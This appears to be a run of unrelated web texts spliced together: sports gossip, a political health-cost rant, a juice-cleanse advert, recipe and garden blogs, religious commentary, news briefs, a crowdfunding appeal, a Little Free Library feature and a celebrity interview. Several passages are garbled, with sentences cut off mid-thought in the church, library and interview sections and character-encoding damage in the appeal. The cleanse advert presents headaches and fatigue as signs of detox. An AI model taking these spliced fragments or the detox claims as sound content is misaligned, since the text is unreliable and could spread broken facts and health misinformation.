The idea of Wayne Rooney being the head-point of the attack is hard to digest, considering they haven't really gone for that before, and Neymar's arrival would make that less likely. Then there's the cost, Barcelona may feel they can get Rooney for a player plus cash deal but would Manchester United want David Villa and would he want them?
He wouldn't be picked over Robin van Persie and isn't as adaptable as Wayne Rooney, he'd spend much of his time on the bench, which is the reason he wants to leave Barcelona. Wayne Rooney is on wages which are so high, according to most reports, that Barcelona would surely rule out the possibility of ever matching them.
Thiago to Manchester United looks more likely by the day, simply because he hasn't said he's staying at Barcelona and their press appear to have given up, but the increasingly wild claims from Sport seem to be based more on office conversations than what they genuinely feel is going on.
On Friday they had a front page claiming it was ULTIMATUM! time for Thiago, but explained inside that he was going to make his decision before July 15th. On Saturday their front page said Thiago to Manchester United was done, but inside they said he could still move to Bayern Munich or another club. On Sunday they claimed that Manchester United were actively trying to sell Wayne Rooney to Barcelona through agents and today Sport push further, they did mention it yesterday, a huge swap deal involving Thiago and Villa for the England international.
Wayne Rooney is currently 14/1 with William Hill to be a Barcelona player on September 3rd. Bet £25 Get a £25 Free Bet.

EIGHT WAYS TO OPT OUT OF OBAMACARE
America needs Obama-care like Nancy Pelosi needs a Halloween mask. –Jay Leno
Obama’s promised savings of $2,500 per year.
Obamacare to Increase Average American’s Healthcare Costs By More Than $7,000
DB
The average American spend $8200 a year on health care. The CHEAPEST plan under Obamacare costs $9760/year. Fortunately, I only have to pay $200/month. The day I sign up, the govt. will forward the remaining $4960 to the health insurance company the day I sign up. So, the government and I are paying $9760 a year when the actuary tables say that I will be spending $8200/year on health care. But that’s not all — I have a $5000 deductible. so I will pay nearly two thirds of that $8600/year myself, before the health insurance company ever has to pony up a cent. So ACA is in fact a vast transfer of tax-payer money to the health insurance company. And health insurance companies do not provide health care: they will not splint a broken arm, or prescribe an antibiotic, or perform surgery. A health insurance company simply holds the bet for how much they think you will be spending on health care — plus enough to make a profit for themselves. And Obamacare has handed them gargantuan, obscene profits, guaranteed, without them having to perform one more iota of service.
Why can’t we give these “tax credits” directly to the physicians, clinics, nurses, and hospitals that actual provide the health care that we all, at some point or another, will need? Wny, because that would be the dreaded socialism! You know, that solicialized medicine that every other industrialized country (including Mexico) provides for their citizens. Except us. Instead, we have handed obscene profits, paid for out of the taxes on our labor, to health insurance giants who are already making a bundle.
That is corporate welfare. And I have another word for it: robbery.

Although we recommend a full 5-day cleanse, a 3 day cleanse can have many benefits by getting rid of toxins in the body and absorbing all the nutrients of the fruits and vegetables included in the juices.
According to Barron’s, America’s premier financial magazine, the juicing industry is growing and is a $5 billion industry in the US. Health benefits of juicing include lower risk of disease and sickness, weight loss and increased energy. A 3 day juice cleanse is a great way to start the detox process and immediately see results. During a cleanse, it is normal to experience headaches, feel light-headed and tired. This is a sign that your body is getting rid of toxins causing fatigue, sickness and even weight gain.
Roots Pressed Juices is committed to providing the freshest juice products from local Texas farmers. The cold-press their juices daily on a hydraulic juicer. This technique grinds the ingredients then presses out the juices from the pulp with thousands of pounds of pressure to get every last drop of juice. Brent Rodgers founded Roots Juices so that people in local communities could embrace juicing just as the do all over the world.
Delivery is available free of charge to select Dallas zip codes, and a low flat rate nationwide. Juices are delivered early in the morning and a 3 day juice cleanse only requires one delivery.I spent last night making a teepee for Amelia, which took me a surprisingly short amount of time. The tough part was actually convincing her that this is the place you sleep, see! I did everything; place treats inside, transfer all of her toys to the back of the teepee, get in it myself, hoping she’d maybe get jealous and join me. Nothing. It’s like she hates me. Or hates it, which makes me sad because I bought a grommet-maker for this thing! When am I going to need a grommet-maker again?
As I sat there trying to figure out ways to communicate to her that this your home/stop laying on the couch and spreading all your hairs all over my stuff, I grabbed a small bowl of this granita-situation out of the freezer. It’s delicious, refreshing and the easiest thing in the world to prepare. I sat in the teepee, eating this thing and what do you know, the little beast was now super interested in the teepee/me/the granita. Now, all I have to do is figure out a way to have blood orange granitas in there 24-7.
For the full recipe and more pictures, head over to PBS!

I’ve always associated granita with summertime but you totally made it look appropriate for winter months, as well, thanks to those juicy and super succulent blood oranges!
xo, Elisa
I’ve never had/made a granita, but this looks delish!
My own corgi is mostly uninterested in me except for when I’m eating, too. I’d love to see a pic of the teepee! We recently upgraded to a king-size bed and had to buy an ottoman for our corg to get up there. Its been a challenge to stop him from leaping off like a flying squirrel though.
Ooo! I actually took my bed off the frame when I got her because I was afraid of her jumping off and hurting her puppy legs (their bones are still developing). I might have to go back and just get her a stool. Haha.
Where are the photos of Amelia in her teepee?!?!
Yes! This is a very good question.
HAHA! They’re coming they’re coming. I have to put some finishing touches on the teepee. And plus, last night it was too dark to take a photo. But I think it looks pretty kewt.
Mmm I love the look of this! And yes, photos of Amelia in her teepee are definitely needed! lol
Gorgeous granita, and please post pics of Amelia + her teepee!
Dogs never understand what’s good for them. Who is too good for a teepee?!
mmm… when I was a little girl my dad made orange granita with snow + orange juice… thank you for reminding me those days
These look so delicious! I’m so not a winter person but these look like an icy kind of perfection I can totally get on board with

Piles of clay can be seen peeking behind the Aster… Hopefully they will be gone soon.
Still little of interest in this area… Once the Asters have bloomed I’ll be landscaping it, so need to get digging the plants up and into pots temporarily.
Cosmos is well behind, I don’t think it will flower before the season is over… With the droughts early on, they just haven’t thrived. Even after sowing them very early on in Jan/Feb… Very disappointed in this ‘right’ border (really ought to name them!) this year, there are large gaps.
Some of the Tomatoes ripening… Can anyone answer why they split after picking?
This Aster has been very impressive, tall indeed but definitely worth it for the amount of insects they attract.

Sorry it's been so long Liz - a long and busy summer and an even busier Autumn awaits I think but thought I'd pop over and say hello - some beautiful pics as usual - the problem with your tomatoes is most likely to do with either watering or erratic weather ie lots of rain and then nothing this link is quite good - hope it helps... take care and will visit again soon I hope... Miranda x
Hi Miranda,
The Tomatoes are not split on the vine, but after picking. They are fine but a few minutes or up to 10 they suddenly crack and I don't know how to stop it - it means I then have to eat immediately.
I'm half wondering whether I should pick in the morning, maybe it's the heat????
Hi - thanks for joining in the end of month view post again. I think we have the same aster
Hi Liz, a nice round up here, your garden has been a lot more colourful than mine, hopefully I will be able to rectify that next year.
I believe your tomato splitting problem (on the vine and shortly after picking) is caused by too much watering or possibly slightly erratic watering also some varieties are more prone than others.
Those are nice mellow views as the garden approaches fall - jealous of your sweetly weaving verbena!
Your garden looks lovely Liz. Erratic weather and watering aside, I tend to find that the cherry tomatoes, especially round cherries, will sometimes split on picking. To avoid this I do two things. Always pick cherries early in the morning when the weather is cool. As the tomato warms, the water inside expands, increasing the likelihood of splitting. The other thing is I pick them with the little green caps intact. Don't pull them off the caps. Most cherry tomatoes are easy to pinch off at a little 'joint' above the cap. I don't remove the caps until I'm ready to use them. Hope that helps.
Liz, I'm always trying to figure out what makes your photos look so special. Do you shoot in RAW? Your white balance looks very clean and less yellow than most pictures on other garden blogs. Maybe that's the difference? Do you apply any photoshop or lightroom adjustments? Confess if you will, I'd love to hear your secrets!
Hi CV,
Thanks for your help re: Tomatoes, I figured I should probably be picking them in the morning... Just with work I normally end up picking them in the afternoon once I've finished... I'll remember to wait until it's cooler, I didn't have this problems last year though, strange.
Hi VW,
I don't shoot in RAW, no... Well I have occasionally but my computer would whimper and die if I attempted to now.
Most photos are as they are off the camera, so it's either my camera or the lenses changing the light. I will when I feel necessary brighten things in Photoshop, yes. But it's normally only a slight touch and then reduce the saturation. Sometimes I'll also be a little more creative and add actions and such but I don't think I've done that since last summer.
Your tomatoes look delicious and the asters are quite lovely!
your garden is so peaceful and gentle. i want to lie amoungst the willowly flowers and watch them sway against the sky. enjoy the tomatoes you harvested tonight. have left a reply in my comments for you too x
Hi Liz - gorgeous photos, as ever.
Re the tomato splitting, pick 'em with the green stalk still attached - that should do the biz!
Have you started your MSc yet?
Have a good weekend :)
Hi Kala,
Thanks, I ate some of the Tomatoes last night with some Feta cheese, Balsamic Vinegar, mixed seeds and a little bit of crusty bread. It’s nice to know exactly where they came from :)
Hi Ginny,
You’re welcome to sit and watch the flowers, although at the moment the weather is a little mixed so you might just get rained on! It’s been hot the past couple of days but it looks like the weather has turned again…
I did enjoy the Tomatoes, thanks! :) There weren’t many, but enough for me.
Hi Liz,
I do usually pick them with the stalk attached, but now I know to keep their little hats on! I was removing their hats after and this must’ve been what was causing the problems.
The MSc starts at the end of September, I have an induction week – woo, forced fun getting to know others – and then lectures start the week after,
My tomatoes are like that also after harvesting them. In that case I always cook it or freezing it rather than staying them fresh while splitting its whole fruit. All of the varieties of tomatoes in my garden are like that except for my cherry tomatoes. I really don’t know why.!— Measurement Tag For Dictionary.com – > <!— Audience Tag for IAC Network – >

The Price of Privacy
Partners in a yard fronting on their two homes dissolve their partnership and now own privately-held, adjoining sections. One of them demands the construction of a solid wall between their properties to prevent his neighbor from invading his privacy by observing his activities and to guarantee his neighbor's privacy.
The damage done by one neighbor to another by invading his privacy through such unwanted observation is considered a serious enough infringement to warrant that the neighbor must consent to his demand and share equally in the cost of construction and allocation of land required for the construction of such a wall.
Even if one of these neighbors owns only one third of the area and the other two-thirds, they must share the cost of the wall equally, because each of them has an equal obligation to take the necessary precaution to remove the threat of privacy invasion which he poses.

The Brightest Light
"The wise ones shall shine like the light of the firmament..."
This is a reference to a judge who rules with perfect justice, and to charity trustees.
"...and those who bring righteousness to the many shall shine like the stars forever." (Daniel 12:3)
This refers to those who teach Torah to Jewish children.
And what sort of illumination is used to describe Torah scholars who constantly study Torah?
"...those who love Him shall be like the sun when it will appear in all its strength." (Judges 5:31)
- Bava Basra 8b
This refers to the power of the sun in the End of Days which will be seven times that of the sun in the first week of creation which was seven times the power of today's sun. This means that the glory of those who dedicate their lives to Torah study will be equal to 343 (73) times the power of the sun we know today. (Targum Yonasan ben Uziel)Business Administration

Aug. 13 (Bloomberg) -- Finnish Prime Minister Jyrki Katainen said his government rejects proposals to give a banking license to the euro region’s planned permanent financial backstop, Germany’s Der Spiegel magazine reported, citing an interview.
Finland is critical of plans to buy government bonds in the secondary market to push yields down, Katainen told the magazine. Bond purchases by the European Central Bank have only brought short-term relief, he was cited as saying.
Bond buying in the primary market could be part of a “sustainable solution” and sales of covered bonds, backed by state assets, may help troubled euro members bring their refinancing costs down, he said.

Date: Wednesday 22 June 2011, 6pm to 7:45pm
Venue: The Millennium Room, The Carriageworks, Millennium Square, Leeds
Speaker: Angus Kennedy, Adam Ogilvie and Andy Abbott.
With the current economic crisis and widespread cuts in public spending budgets, things are even more financially precarious for the arts than usual; and many have been forced to reappraise how they argue the case for funding.
The Department for Culture Media and Sport (DCMS) is investigating techniques to assess the economic value of the arts — what it terms non-market goods — in terms of what people feel they would be willing to pay if they were not free.
The February 2011 Royal Society for the Arts (RSA) pamphlet, Arts Funding, Austerity and the Big Society: Remaking the case for the arts, states:
"The Commission on 2020 Public Services at the RSA has called for more public investment to be evaluated in terms of a ‘social productivity test’: whether it builds individual and community engagement, resilience and reciprocity."
The pamphlet attempts a bold response to the challenge presented by the funding cuts, but is there something wanting in the solutions offered?
This discussion aims to challenge the participation approach of chasing audiences, in favour of more compelling reasons why the arts should receive public funding, and ask some difficult questions such as:?
£5 waged/£3 unwaged on the door
This debate is part of the Emerge Leeds Festival 2011 being held at the Carriageworks Theatre from the 19th to the 26 June. For more information go to:.

Whypoll is Indiaï¿½s first open government platform. It has a simple aim ï¿½ take gaps in governance and fill it with effective technology that ordinary people can use for the lowest possible cost.
The on-ground mobilization and activism-led not-for-profit Whypoll Trust and its technology creation arm, the Peoples Infotainment Company, work to create technology that is given away free or at the lowest possible cost and which fills a particular social need.
In the last two years, we have worked with the UN Millennium Goals Campaign and had a wide range of top-ranking politicians, economists, scholars, bureaucrats, entrepreneurs and activists have actively supported Whypollï¿½s work.
Our work has been featured in the New York Times, the Washington Post, the Chicago Tribune, the Christian Science Monitor, Reuters, and almost all top Indian media organizations from The Times of India, Hindustan Times, the India Today Group and NDTV.
Why no Indian woman in safe
In the last 40 years, rape cases in India have gone UP by a shocking 800 percent. In the Indian capital New Delhi, with one of the most modern tube intra-city railway networks in the world, there is still an assault of a woman every minute, every second scores of others are harassed.
One of the biggest problems of the crimes against women in India is widespread under reporting which happens because people, especially women, just donï¿½t feel confident enough to go to the police. The police are often perpetrators of more harassment than immediate relief providers.
A large number of cases of such harassment and violence go unreported due to the social stigma attached to being raped or molested and also due to fear of further harassment in the hands of lower levels cops. Reporting a case to police is often another form of social harassment faced by victims. Once raped, it is close to impossible for a family to get their member married into a family. There have been shocking instances where victims have been asked to marry their violators!
This is why Whypoll has worked to create Indiaï¿½s first integrated womenï¿½s safety platform that works on three different layers.
Our constantly monitored crowd sourced research ensures that our UNSAFE MAPs of different cities is always update for the use of citizens and tourists.
For any incident of harassment, people can report on the site anonymously or with their details, as they choose, and reports of these incidents are compiled and reflected on the map and sent to police.
Our harassment reporting mobile application ensures that an immediate SOS to family and friends.
The campaign has already started and has been widely reported with stories everywhere from the New York Times to The Times of India and supported by thousands of people in the Indian capital New Delhi where it has been launched.
Now we need funds to take it across India to 9 more troubled cities where women face the gravest challenges to their personal liberty and security in public areas. We want to expand the campaign ï¿½ the map, the unsafe surveys, the use of the harassment reporting portal and the app to a total of 10 Indian cities where women face maximum security challenges.
On our list, apart from New Delhi, are Mumbai where two young men were recently brutally murdered by goons when they tried to stop eve-teasing, Bangalore, where women dancing and having a drink in a pub have been attacked by goons, to northern cities and satellite towns like Lucknow, Allahabad, Bhopal, to eastern India in Kolkata (Calcutta) and down south in Chennai, Hyderabad and Thiruvananthapuram.
This will ensure that the top 10 most violent cities and towns against women will be mapped for safety and a public service technology to fighting against this crime. The funds will be used to scale up our endeavours started in the capital of India to across the vast country to a total of 10 places where women need easy to access, technology driven tools to fight back against this menace.
At the moment, there is a sense of helplessness about this crime ï¿½ and we believe that can and must change. We must Fight Back!
What We Need & What You Get
We need a total of $50,000 to spread this to a total of 10 cities. For each city, we will hire on-ground researchers who will survey across the chosen city for a period of at least 45 days to create a unique UNSAFE areas in that city MAP which will become the base on which the campaign will be conducted in that city.
The money will be spend in paying researchers and creating the database for each map in each city and also to run a campaign to make people aware of the grave issue of violence against women in public spaces.
Each city will have its own micro site which will have a map and a reporting portal and the link to download an SOS mobile application. The money will also be spent in building microsites for each city that we target.
Our goals are clear ï¿½ we want to create citizen driven tools which are free to use or extremely low cost to fight harassment against women in public spaces. And we have demonstrated on that the idea is not only vital on paper but also can be implemented successfully on the ground. We have spent our own money and resources in creating and implementing this campaign, including the soon-to-be launched app, in New Delhi, showcasing that it is a much needed campaign with wide support among citizens.
Our strength lies in the fact that not only do we have a powerful idea but we have also showcased that it works and there is already something significant ï¿½ that has been reported on by some of the biggest news organizations around the world ï¿½ that exists on the ground.
Now we need funds to spread the campaign across India to thousands of more women who desperately need this kind of tools to fight harassment.
Our goal is to reach a total of 10 cities and every dollar given to us will enable us to go a little further in that goal. If we raise less, we will be able to reach less than 10 number of cities but the campaign will still go on in various cities and towns, but with less funds we will not be able to reach 10 cities and towns.
Please note that not a single dollar from your contributions will go as payment to the owners of the project as salary or remuneration. The creators of the project do not take a cent as salary or remuneration and every dollar given will be used in the project.
For your generosity, we will send you, depending on contribution specially commissioned prints of photos of images of India, beautiful drawings, sketches, charcoals, and hand painted, authentic Indian water colour paintings of various sizes ï¿½ from postcard size to canvas size, along with hand written thank you notes. Please note that all art work is donated to us by artists who believe in our cause and no money is spent in specially procuring the art.
Other Ways You Can Help
We would also really appreciate opportunities to cross link similar sites with Whypoll () which would cross pollinate the sites and spread the word about the campaign.

Colorado parish dedicates 'beautiful' new church
Denver, Colo., Mar 29, 2013 (CNA/EWTN News) -
Our Lady of Mount Carmel, a parish of the Denver Archdiocese, recently dedicated its new church building which local Archbishop Samuel J. Aquila has described as “beautiful.”
“The beauty of it... speaks to the gift of our faith, and that this is a place where the Lord is truly present and dwells,” the archbishop told CNA shortly after the dedication Mass on March 23.
Our Lady of Mount Carmel is located in Littleton, a suburb of Denver, and is a personal parish of the Priestly Fraternity of Saint Saint Charles Borromeo.
Fr.er's the gift of the Catholic faith.
Fr. Jackson explained to CNA March 27 Fr. Jackson.
“Any church,” he explained, “needs to be in harmony with what you're doing at the altar.”
Our Lady of Mount Carmel continues to work through its remodeling. In the future, the parish hall and basement will be renovated, and to the church will be added a choir loft, narthex, baptistry, and bell tower.
“Of course, it's not enough (just) to have beauty,” reflected Fr. Jackson.
“You have to speak truth from the pulpit, and give kindness and mercy in the confessional, but beauty really does move the soul of modern man in a marvelous way.”

The solar eclipse mentioned in the annals of Mursili II is of great importance for the absolute dating of the Hittite Empire within the chronology of the Ancient Near East. The annals record an "omen of the sun," for the tenth year of Mursili's reign, which appeared just as he was about to launch a campaign against the Kaskas of northern Anatolia. There are only two possible dates for the eclipse: 13 April 1308 BC or 24 June 1312 BC. The 1312 BC date is accepted by most Hittitologists, e.g. Trevor Bryce (1998), while Paul Astrom (1993) has suggested the 1308 BC date.There are no upcoming events.

Sandwiched between sliced bread and tumbleweeds, at No. 11, was Little Free Library, a homespun-tribute-turned-international-phenomenon started by Rotarian calls Little Free Library “a new canvas for community groups” – such as artists in New York City, who held a competition to design the boxes; inmates at a Wisconsin prison, who are constructing them as part of vocational training and community service; AARP, which is funding their installation at the homes of isolated elderly people; and corporations, which are building them on service days to give back to their communities. Rotary and Rotaract clubs from the United States to Canada, Mauritius to Ghana, are installing the libraries in their areas too.
Real estate agents report that a Little Free Library can encourage people to buy a home in the surrounding neighborhood, because it signals the kind of community-oriented place they are looking for. Residents in areas devastated by Hurricane Sandy installed the libraries so that even when nothing else worked, they would have books to read. Scientists in Antarctica want to build one at their airport. “The concept of more neighbors meeting than ever before is what keeps us vibrant and keeps us going,” Bol says.
About three-quarters of the operators (the organization calls them stewards).
Bol tinkers with prototypes at the Little Free Library workshop, located in Hudson, Wis. (population 13,187), in a nondescript industrial building next to a granite shop and a medical supply company. He calls one model – painted blue and adorned with tobacco lath he picked up at an auction – the blue shack of tobacco road, after the Johnny and Edgar Winter song. Another has a roof garden, and a third has a paint treatment to mimic stucco found on homes on the East and West coasts.
“We often call this Santa’s workshop,” Bol says. Stacks of books donated by a local publisher line the entryway. The shelves of a closet closed off by a beaded curtain are lined with paint cans. An entire room (Bol nicknamed it the accoutrement room; the staff call it Grandma’s barn) is overflowing with knickknacks destined to end up on a Little Free Library someday – blocks and Tinkertoys for a children’s library, a ceramic radish bunch that could adorn a cookbook library. “My wife and I are pickers,” Bol explains. “We go to thrift stores, Goodwill, find things where the antique stores would find them.” The organization’s creative director is painting the signs that go out to everybody who registers a library. (Another perk for those who pay the optional $35 registration fee: listing your library’s location on a map on the website.) Two Pomeranian-wheaten terriers named Shelby and Sienna bound out, tails wagging, to greet visitors. “This is the ultimate made-in-America cottage industry,” Bol says.
See some Little Free Libraries from throughout the country:
Bol has a scruffy beard and is wearing hiking pants and a multipocketed vest embroidered with the Little Free Library logo. He’s a raconteur who talks in punch lines. “I picture a comedy sketch going on across America. Our audience is 50+-year-old women, highly educated. I always get this vision of women smacking their husbands on the arm and saying, ‘Get out of the house and make something useful. I’m tired of those birdhouses – build me some libraries,’” he jokes during a phone call on his way to drop off libraries after a trip to the Minnesota State Fair. “People ask, ‘Why do you work so hard?’” he says, during another call on the way home from his weekly Rotary club meeting. “When I die and people look at all the plaques I got, they are going to say, ‘Well, maybe he wasn’t such a bastard after all.’”
For the organization’s boardroom, Bol crafted wooden desks and a set of shelves out of an old barn floor. He uses woodworking to relax, he says, just as someone else might go fishing or play golf. An international development specialist, in 2001 he founded a company that staffed U.S. hospitals with nurses from developing countries. The firm gave the nurses scholarships for graduate school; in exchange, they agreed to return to their home countries to teach other nurses. He sold a stake in the company to investors, who, when the economic downturn hit, wanted to close Bol’s office and transfer him to Cincinnati. With his family firmly planted in Hudson, Bol declined, and he and the company parted ways in 2008. After years of working overseas, he joined the Rotary Club of Hudson. “I knew the president of the Philippines, top officials in Asia, but nobody in my hometown knew who I was,” he says.
After his mother died, he spent almost a month traveling around in his minivan, listening to self-help books and contemplating his future. When he arrived back home, he and his wife began turning their garage into an office. When they replaced the garage door with windows, he didn’t want to let the vintage door go to waste, so he built a miniature red schoolhouse out of it in honor of his mother. He put it in his front yard and filled it with books. In May 2010, his wife held a garage sale, and everybody who came by loved the library. “They acted like it was a little puppy. They got all excited,” he says.
Around the same time, he became friends with Rick Brooks, an expert in community development (and, coincidentally, an editor for The Rotarian in the 1970s). The two kicked around ideas for social entrepreneurial opportunities and kept coming back to Bol’s library. “We knew there was genuine interest in this,” Brooks says. During the summer of 2010, Brooks, who lives in Madison, installed a library on a bike path outside an art gallery and coffee shop, where thousands of passersby saw it. By this time, Bol, who had built several more and given them away, could no longer keep up with demand. He hired an Amish carpenter as the primary craftsman, who created libraries using wood from a barn downed in a tornado. Bol credits Brooks as cofounder of the organization: “I could not have started this without Rick,” he says.
As the libraries gained attention through word of mouth and media coverage, they began appearing everywhere. Inspired by other library pioneers such as Lutie Stearns, a librarian who brought “traveling little libraries” to nearly 1,400 locations in Wisconsin between 1895 and 1914, Bol and Brooks set a goal of creating 2,510 libraries – one more than Andrew Carnegie. They hit that number in August 2012, a year and a half before their target date. These days, they talk about how they can harness the worldwide enthusiasm for the idea into a movement that goes beyond individual homeowners. “How do we use that energy to foster better relationships, improve literacy, and get neighbors to talk to one another?” Bol asks.
On an unseasonably warm and sunny day in October, they offer some answers to that question. Bol and Brooks are standing outside the Minneapolis/St. Paul chapter headquarters of Little Brothers – Friends of the Elderly. Located across the street from a mattress store with a colorful mural on its exterior, the nonprofit provides holiday meals, friendly visits, and other social activities for more than 750 Twin Cities seniors annually. Its volunteer-maintained landscaping offers an oasis in a neighborhood not known for its tidy lawns. The organization’s staff is debating where to put its library, the first in a new partnership between Little Free Library and AARP to reach isolated elders. “It’s a gathering place. It’s the perfect place for a library,” says Jay Haapala, AARP associate state director for community outreach, who is there for the kickoff. “Neighbors can come over, too, and find out what goes on here.” As if on cue, an older gentleman walking by spots the blue and taupe library sitting on the ground and strikes up a conversation with Greg Voss, Little Brothers executive director. “This is big for us,” Voss says later. “We’ll get some traffic. It will be more people at our doorstep.” The Friends Through the Years partnership will install at least 40 libraries – including a second at the home of a 96-year-old woman, who has a lifetime of books she wants to share and is looking forward to some new reading material of her own.
Later that afternoon, Bol and Brooks arrive at a purple house and serendipitously find Natalie Johnson Lee and Ann Luce, two members of the year-old Rotary Club of North Minneapolis, sitting on the walkway stairs with a stack of books. The club had heard about the Little Free Library that Bol and Brooks are helping to install at the home and wanted to donate some reading material. Ariah Fine, who lives there, begins to dig out the hole for the post, and his children, Breton, 7, and Adyra, 6, help position the library. The children put in some Dr. Seuss books they’ve outgrown. Fine looks forward to featuring local authors and tailoring the selections to his community. “It will be a great way to connect with neighbors,” he says.
The library at Fine’s home is part of another Little Free Library program, Books Around the Block, which aims to install the boxes in struggling urban neighborhoods. Research shows that children who have books at home read at levels up to two grades higher than those who don’t. “One of our goals is to increase access to books and parent engagement on the North Side,” says Olivia Quintanilla, an AmeriCorps volunteer with Minneapolis Public Schools, which is working with Little Free Library.., is installing 100 miniature libraries to celebrate its 100th anniversary in June 2015. The local newspaper ran an article about the ribbon-cutting for the first one; within hours of publication, the club had received six phone calls from people interested in participating. The club is paying the fee to register the boxes with Little Free Library; the signs for the libraries are personalized with the club’s name. Later, the Rotarians plan to hold a scavenger hunt involving the libraries and highlight them on a Facebook page. “The response has been overwhelming,” says Candace Schuler, who is heading up the project. “People tell me, ‘I. Never one short for stories, Bol compares the mushrooming interest in the microlibraries to being a parent watching his children open gifts at Christmas, Gandhi going where his followers take him, and the Wizard of Oz. “I just feel fortunate that this happened,” he says. “I feel like I discovered the Tin Man on the Yellow Brick Road, and I put in some oil and he started dancing. And I had the great pleasure to have been the person who put the oil in.” – Diana Schoberg

Background: N-alpha-acetylation is one of the most common protein modifications that occurs during protein synthesis and involves the transfer of an acetyl group from acetyl-coenzyme A to the protein alpha-amino group. ARD1A, together with NATH (NARG1, MIM 608000), is part of a major N-alpha-acetyltransferase complex responsible for alpha-acetylation of proteins and peptides (Sanchez-Puig and Fersht, 2006 [PubMed 16823041]).

As the object of Keri Russell’s affections on the WB Network’s TV series "Felicity", "Batman Forever"  "Kitchen Party", a Canadian film released in 1997. More lackluster work in television followed until Speedman, his career at a low, went to Manhattan to audition for the upcoming show Felicity. The show’s creators were taken with his performance, and Speedman was soon living in Los Angeles, where the show was filmed. The positive attention that followed Felicity thriller  never-ending battle between vampires and werewolves in "Underworld".
Fans of the actor will enjoy him pursuing Ice Cube and company in the new XXX while Underworld 2 will be released later this year. He caught up with Paul Fischer in New York.
How is it to play clean shaven guys?
I shave. I just don’t like to shave.
How do the ladies feel about scruffy?
Hopefully they’re fine. I don’t know if that would make me shave or not, but I think they’re fine.
After young cadets, is it nice to graduate to man in charge?
Yeah..
Did you do all the physical stuff?
Yeah. For me that’s pretty easy. That doesn’t intimidate me. And I’d love to tell you it was harder than it was. It wasn’t that difficulty. People seem to think it was crazy and very dangerous, but for me it wasn’t that bad.
How did you find an arc amid the craziness?
Well, you work hard. You do as much work as you possibly can before you start the movie and then you get there and it’s a crazy scene. It’s very chaotic and it’s about a lot of the stunts and the special effects and the action. You work hard before the movie and then you just try to have fun.
Do you ever think that there may be too much analysis for an action movie?
Yeah, absolutely, but it’s the only way I know how to do it. There’s nothing worse—I don’t like listening to actors talk about the process, especially when- – I mean, for me I’ve played a lot of guys, dudes, boys in a sense and this was a challenge for me just to play that official character. And I’m not going to get into too much as you say, you’re right. But that was a challenge for me to do that. But you’re right, and you’ve got to have fun with a movie like this. That’s the point.
Will they bring you back?
Who knows? Because they kind of dismantled it after the first one, so we’ll see. I have no idea.
Are you signed?
I believe I am signed.
What will your role be in the next one?
That depends who they hire to be the next XXX I guess. If they do one. I don’t know, we’ll se if they do one. I have no idea. That’s a great question and I don’t have an answer.
Was it the type of role that made you accept this?
Yeah, I mean, I’d like to stretch it out a bit, but the actors and the director were another part of why I wanted to do this. I was saying before that this is one of the better things with a really good group of people that came around for me at the time, so I was really excited to get to work with those guys for sure.
What surprised you about Cube?
I guess I wasn’t that surprised with anything. I mean, I walked in knowing he was going to be a good actor and a really cool guy. That’s my thought abut him and that’s why it was, a very good actor. I was really excited that he was doing it more so than Vin Diesel in a lot of ways. I was really excited.
How so?
I just think he’s a cool actor and I was more excited because it made it less of a sequel, just bigger and better.
Do you listen to his music?
I remember listening to Cube’s music when I was like 14 years old, my friends listening to it up in Toronto. I had no idea what it was and it scared the shit out of me.
Did you tell him that?
No, no, no. I wouldn’t talk to him like that. To be honest, no, I don’t know his music very well at all but I know him much more as an actor.
Did you model you character after Tommy Lee Jones?
No, no, no, I don’t. I don’t think I could do a good imitation of Tommy Lee Jones. I guess there is sort of a similarity there but that guy’s pretty amazing.
How did you get on this action kick?
I don’t know. My friends ask me that all the time. I have no idea. After I came off of doing a TV show, just trying to find work that would enable me to do other movies. And I did a couple of small movies that I really like and trying to find something else to do. This movie in particular came along at the right time and I just decided to do it. It’s not like I have 10 choices. I have to audition for anything reasonable.
Do you miss doing small movies?
Yeah, absolutely. That’s where I feel I’m strongest anyway. I would love to do more movies like that.
How was filming Underworld 2?
That was physical. That I’ll brag about. That was physical. That was really physical for me. I finished that two weeks ago and I’m still tired from that.
How much more physical was that?
A lot more for me. They knew after the first one. In a way I kind of proved to them that I could do a lot of stuff, so in the second one, it was just taken for granted that I would do most of everything in the movie, so it was a hard workload.
What can you say about your character?
It’s tough to say. It goes to a different- – again, it’s more about the relationship. I wish I could say more about it, but in a lot of ways, I’m still very much supporting that main character. It’s more I’m the sidekick. A good one, but I’m the sidekick to be honest. It’s really her movie in a sense.
How are the makeup and FX?
I think they’re a lot better. I’d hum and huff if I didn’t think it was good, man. I think it’s very good and I’m not necessarily a huge fan of those movies, so for me when I see the stuff they put together, I’m very impressed. I think Len Weisman, the director did a great job and they hired a very, very good DP.
And the stuff on your face?
Oh, that stuff is cool. They changed it up a little bit, but they added to that whole thing for sure. I was in it a lot more also.
What’s next?
I’m trying to find the next thing I want to do. I don’t know what it’s going to be but I’m trying to find something good to do.
Nothing offered?
Sadly, no. We’ll see. Something will come along.
We haven’t seen you in a year and a half. What’s been going on?
Well, I’ve been filming that movie. I bought a house in LA, hanging out there and spending a lot of time in Toronto, but not much.
Do you miss NY?
Yeah, I miss this city very much. I actually came here earlier to try to find an apartment which is a tough experience.
You’re buying a lot?
Well, I’m not really buy- – I buy- – you know, I drive a Honda Civic. I’m not spending a lot of money on cars and stuff like that, but I would love to be able to own something here and spend more time here. I think it’s- – I’ve never felt totally comfortable in Los Angeles. I feel like I’m visiting most of the time. I mean, I love California, but LA to me is still a strange place. I like the east coast.
So why did you succumb to the pressure to live there?
Well, I was there for four years, five years doing a TV show so I had to be there for that time. Then when I was done, this was my first two years since I’ve been done that. I’ve been working location for a while. To be honest, I want to be there to a degree for my career. I mean, it’s pretty important to me. And when I have lived elsewhere, every two weeks I have to fly back to LA. Even New York directors go there to audition. So I have to be there to a degree.
Come on, LA’s not so bad.
No, It’s not that bad. I don’t hate it. I don’t hate it at all. I just would like to spend more time in New York City.
Are you still seen as Ben?
Well, it’s a good trade, man..
Would you return to TV?
I haven’t ruled it out. There’s such good writing now on television and I don’t see a lot of great writing on films sadly. There’s a good group of people that get to do it, but if I’m not getting to do that in a good couple years, I will look to do some television.
What about the Canadian industry?
It’s not the greatest. I’m sort of ignorant to what’s going on but I hear through friends that are having a lot of difficulties with Telefilm Canada and they’re funding and what they’re doing and where they’re deciding to put their money. They’re not putting it into the right places from what I understand, but I’m still again sort of- –
It happens everywhere.
I guess, but you look at the Australian communities and the English communities, they manage to do it. I think Canada, our industry is still somewhat based in America’s industry.
UK and Australia survive through government funding. Does Canada?
